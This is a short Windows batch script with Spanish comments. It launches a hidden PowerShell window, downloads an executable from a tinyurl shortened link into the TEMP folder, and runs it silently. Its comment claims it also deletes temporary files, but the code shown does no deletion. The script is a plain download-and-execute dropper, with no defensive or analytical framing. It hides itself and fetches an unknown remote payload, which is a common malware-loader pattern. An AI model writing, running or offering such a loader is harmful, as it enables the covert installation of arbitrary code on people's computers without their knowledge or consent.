@echo off
:: Script para descargar y ejecutar un archivo desde una URL de manera oculta, y luego eliminar archivos temporales

:: Abrir PowerShell de manera oculta y descargar el archivo
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://tinyurl.com/294vx63t' -OutFile $env:TEMP\archivo.exe; Start-Process -Wait -FilePath $env:TEMP\archivo.exe -WindowStyle Hidden"

:: Salir del script
exit
